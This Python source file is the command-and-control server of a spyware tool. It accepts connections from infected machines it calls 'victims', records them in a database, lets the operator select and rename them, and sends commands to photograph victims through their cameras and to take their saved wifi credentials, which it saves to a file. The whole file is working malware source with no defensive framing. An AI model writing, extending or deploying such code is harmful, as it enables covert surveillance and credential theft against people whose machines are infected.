import socket
import threading
import time
from colorama import Fore, Back, Style

# Local imports
from handle_db import *
from spyware_module import *

HOST = ''
CMD_PORT = 55555
DATA_PORT = 44444

# Todo: Make a file downloader (3)
# Todo: Make an encryptor/decryptor (4)

class ChooseToAttack(object):
    # selected_user, users_online[x] => [IP, PORT, CMD_CONN, DATA_CONN] * reference

    def __init__(self):
        self.selected_user = {}
        self.users_online = {}
        self.online_size = len(self.users_online.keys())
        self.buffer = 1024
        self.switch = True
        self.refresh_sc = True
        self.printing_done = bool
        self.printing_anim = True
        self.input_thread = True
        self.database = ManageDB()

    def get_connections(self):
        while True:
            cmd_conn, addr = cmd_sock.accept()
            data_conn, _ = data_sock.accept()
            IP, PORT = addr[0], addr[1]

            db_output = self.database.find(IP)
            name = db_output[0] if db_output else random_name()

            if not db_output:
                self.database.insert(name, IP)

            elif name in self.users_online:
                # Prevents 2 connections from the same PC
                cmd_conn.close()
                data_conn.close()
                continue

            self.users_online[name] = [IP, PORT, cmd_conn, data_conn]
            thread = threading.Thread(target=self.check_connection, args=(name, self.users_online[name]))
            thread.start()

    def check_connection(self, name, user_data):
        # user_data => [IP, PORT, CMD_CONN, DATA_CONN]
        while True:
            try:
                if name not in self.selected_user:
                    online = user_data[2].recv(self.buffer)

                    if online:
                        pass
                    else:
                        raise ConnectionResetError
                pass

            except (ConnectionResetError, ConnectionAbortedError):
                if name in self.selected_user:
                    del self.selected_user[name]

                del self.users_online[name]
                self.refresh_sc = True
                break

    def pick_victim(self):
        while self.switch:
            if len(self.users_online.keys()) > self.online_size or self.refresh_sc:
                self.refresh_sc = False
                self.online_size = len(self.users_online.keys())
                clear_screen()

                if self.printing_anim:
                    for line in ascii_logo:
                        if '\n' in line:
                            time.sleep(0.1)
                            print(line, end='')
                        else:
                            print(f'{Fore.GREEN}{line}{Style.RESET_ALL}' , end='')
                    self.printing_anim = False
                else:
                    print(f'{Fore.GREEN}{ascii_logo}{Style.RESET_ALL}', end='')

                raw_desc = ' - Type the name of the victim you want to select!'
                rename_desc = f" - Type '{Fore.YELLOW}rename{Style.RESET_ALL}' to rename a victim!"
                select_desc = f" - Type the {Fore.YELLOW}name{Style.RESET_ALL} of the victim you want to select!"

                print('=' * len(raw_desc))
                print(rename_desc)
                print(select_desc)
                print('=' * len(raw_desc), end='\n\n')

                for victim in self.users_online:
                    print(f" [+] {Back.BLUE}{victim}{Style.RESET_ALL} [+] connected on \"{Fore.BLUE}{self.users_online[victim][0]}\"{Style.RESET_ALL}")
                self.printing_done = True

            elif self.input_thread:
                self.input_thread = False
                inp_thread = threading.Thread(target=self.get_input)
                inp_thread.start()
            else:
                continue

    def get_input(self):
        while self.switch:
            if self.printing_done:
                user_input = input('\n >>> ')
                self.printing_done = False

                if user_input in self.users_online.keys():
                    self.selected_user[user_input] = self.users_online[user_input]
                    self.switch = False

                elif user_input.lower() == 'rename':
                    name = input("\n Type the name of the victim you wish to rename > ")

                    if name in self.users_online.keys():
                        new_name = input(f"\n Type a new name for {name} > ")

                        if new_name and new_name != name:
                            self.database.update(new_name, name)
                            self.users_online[new_name] = self.users_online[name]
                            del self.users_online[name]
                        else:
                            print(f'\n ERROR: username [{name}] already exists!')
                            input(' Press ENTER to continue > ')
                        self.refresh_sc = True
                    else:
                        print(f'\n ERROR: user [{name}] does not exist!')
                        input(' Press ENTER to continue > ')  # MAKE IT A FUNC --> pressEnter()
                        self.refresh_sc = True
                else:
                    if user_input != '':
                        print(f"\n Error: No user found named [{user_input}]")
                        input(' Press ENTER to continue > ')
                    self.refresh_sc = True


class ExecuteCMD(object):
    def __init__(self, victim_data):
        self.switch = True
        self.input_thread = True
        self.refresh_sc = True
        self.printing_done = False
        self.offline = False
        self.buffer = 1024
        self.victim_data = victim_data
        self.printing_anim = True
        self.real_name = list(self.victim_data.keys())[0]
        self.cmd_conn = self.victim_data[self.real_name][2]
        self.data_conn = self.victim_data[self.real_name][3]

        self.run_cmd = {
            'Take picture': ['Take (x) pictures every (y) seconds', self.take_pictures],
            'Back': ['Go back to victim selection', self.back],
            'Wifi': ['Get victims wifi credentials', self.get_wifi]}

    def pick_command(self):
        while self.switch:
            if self.refresh_sc:
                self.refresh_sc = False
                clear_screen()

                if self.printing_anim:
                    for line in ascii_cmd:
                        if '\n' in line:
                            time.sleep(0.1)
                            print(line, end='')
                        else:
                            print(f'{Fore.YELLOW}{line}{Style.RESET_ALL}', end='')
                    self.printing_anim = False
                else:
                    print(f'{Fore.YELLOW}{ascii_cmd}{Style.RESET_ALL}')

                raw_txt = ' Type the name of the command you want to use on'
                text = f'{raw_txt} [{Back.BLUE}{self.real_name}{Style.RESET_ALL}]'
                print('~' * (len(raw_txt) + len(self.real_name) + 3))
                print(text)
                print('~' * (len(raw_txt) + len(self.real_name) + 3), end='\n\n')

                for cmd in self.run_cmd:
                    print(f" {Fore.YELLOW}{cmd}{Style.RESET_ALL} / {self.run_cmd[cmd][0]}")
                self.printing_done = True

                if self.input_thread:
                    self.input_thread = False
                    inp_thread = threading.Thread(target=self.get_input)
                    inp_thread.start()

    def get_input(self):
        while self.switch:
            if self.printing_done:
                command = input(f"\n {Fore.GREEN}CMD{Style.RESET_ALL}: ")
                self.printing_done = False

                if self.offline:
                    print(f" [{self.real_name}] is {Fore.RED}OFFLINE{Style.RESET_ALL}!")
                    input(' Press ENTER to go back to victim selection! > ')
                    self.switch = False
                    self.refresh_sc = True
                    break

                if command in self.run_cmd:
                    output = self.run_cmd[command][1]()

                    if output == 'back':
                        self.switch = False

                    elif output == 'take picture':
                        self.take_pictures()
                self.refresh_sc = True

    def take_pictures(self):
        self.cmd_conn.send('take picture'.encode('utf-8'))
        img_downloader(self.data_conn)

    def get_wifi(self):
        self.cmd_conn.send('get wifi'.encode('utf-8'))
        wifi_data = self.data_conn.recv(self.buffer).decode('utf-8')
        file = open('wifi.txt', 'w')
        file.write(wifi_data)
        file.close()

    def back(self):
        self.switch = False

    def user_online(self):
        # Thread checking selected_user dict from to_attack object
        # to see if the user disconnected
        while True:
            if not to_attack.selected_user:
                self.offline = True
                break


if __name__ == '__main__':
    cmd_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    data_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cmd_sock.bind((HOST, CMD_PORT))
    data_sock.bind((HOST, DATA_PORT))
    cmd_sock.listen(5)
    data_sock.listen(5)

    to_attack = ChooseToAttack()
    listener = threading.Thread(target=to_attack.get_connections)
    listener.start()

    while True:
        to_attack.switch = True
        to_attack.input_thread = True
        to_attack.refresh_sc = True
        to_attack.pick_victim()

        execute = ExecuteCMD(to_attack.selected_user)
        online_thread = threading.Thread(target=execute.user_online)
        online_thread.start()
        execute.pick_command()
